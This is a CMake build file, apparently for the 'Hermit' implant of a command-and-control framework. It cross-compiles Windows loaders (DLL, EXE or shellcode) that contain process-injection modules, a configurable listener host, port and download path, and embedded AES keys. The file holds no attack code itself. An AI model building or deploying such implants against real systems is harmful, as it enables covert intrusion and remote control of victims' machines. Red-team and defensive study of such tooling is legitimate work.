cmake_minimum_required(VERSION 3.22)
project(${PAYLOAD_NAME}.${PAYLOAD_ARCH})

# COMPILER
if(${PAYLOAD_ARCH} STREQUAL "amd64")
    set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)
elseif(${PAYLOAD_ARCH} STREQUAL "i686")
    set(CMAKE_CXX_COMPILER i686-w64-mingw32-g++)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# FLAGS
set(CMAKE_CXX_FLAGS "-municode -Os -s \
    -fno-asynchronous-unwind-tables -falign-jumps=1 -falign-labels=1 \
    -ffunction-sections -fdata-sections -fno-exceptions -fPIC \
    -static-libgcc \
    -Wl,-subsystem,windows,-s,--no-seh,--enable-stdcall-fixup,--gc-sections,-Bstatic"
)

# INCLUDE
include_directories(include)

# DEFINE
add_compile_definitions(PAYLOAD_TYPE=${PAYLOAD_TYPE})
add_compile_definitions(PAYLOAD_TECHNIQUE=${PAYLOAD_TECHNIQUE})
add_compile_definitions(PAYLOAD_PROCESS_TO_INJECT=${PAYLOAD_PROCESS_TO_INJECT})
add_compile_definitions(LISTENER_PROTOCOL=${LISTENER_PROTOCOL})
add_compile_definitions(LISTENER_HOST=${LISTENER_HOST})
add_compile_definitions(LISTENER_PORT=${LISTENER_PORT})
add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
add_compile_definitions(AES_KEY_BASE64=${AES_KEY_BASE64})
add_compile_definitions(AES_IV_BASE64=${AES_IV_BASE64})

# SOURCE
set(COMMON_SOURCES
        src/hermit.cpp
        src/core/crypt.cpp
        src/core/procs.cpp
        src/core/technique/injection/dll_injection.cpp
        src/core/technique/injection/shellcode_injection.cpp
        src/core/handler.cpp
        src/core/stdout.cpp
        src/core/system/arch.cpp
        src/core/system/env.cpp
        src/core/system/http.cpp
        src/core/system/process.cpp
        src/core/utils/convert.cpp
)
if(${PAYLOAD_TYPE} STREQUAL \"dll-loader\")
    set(SOURCE src/main/dll_loader_${PAYLOAD_FORMAT}.cpp ${COMMON_SOURCES})
elseif(${PAYLOAD_TYPE} STREQUAL \"exec-loader\")
    set(SOURCE src/main/exec_loader_${PAYLOAD_FORMAT}.cpp ${COMMON_SOURCES})
elseif(${PAYLOAD_TYPE} STREQUAL \"shellcode-loader\")
    set(SOURCE src/main/shellcode_loader_${PAYLOAD_FORMAT}.cpp ${COMMON_SOURCES})
endif()

# LINK LIBRATILIES
link_libraries(bcrypt crypt32 winhttp wsock32)

# ADD
if(${PAYLOAD_FORMAT} STREQUAL "dll")
    add_library(${PROJECT_NAME} SHARED ${SOURCE})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            LIBRARY_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".dll"
    )
    add_definitions(-DIS_DLL)
elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
    add_executable(${PROJECT_NAME} WIN32 ${SOURCE})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".exe"
    )
endif()
